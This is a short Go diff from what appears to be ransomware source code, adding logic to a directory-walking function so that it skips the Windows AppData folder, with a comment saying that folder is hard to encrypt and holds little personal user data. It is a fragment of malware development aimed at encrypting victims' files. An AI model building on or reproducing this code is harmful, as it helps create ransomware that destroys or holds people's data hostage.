@@ -78,7 +78,15 @@ func (f *Files) ScanToDecrypt() ([]string, error) {
 	var files []string
 	err := filepath.Walk(f.rootDir, func(path string, info os.FileInfo, err error) error {
 		stat, error := os.Stat(path)
-		// If there's an error, catch it
+		/*
+			The AppData folder contains a load of files that are difficult to
+			encrypt (because of permissions) and it doesn't contain much
+			personal user data, so we'll skip trying to encrypt it.
+		*/
+		if info.IsDir() && info.Name() == "AppData" {
+			return filepath.SkipDir
+		}
+		// If there's an error getting files, print the error.
 		if error != nil {
 			return error
 		}
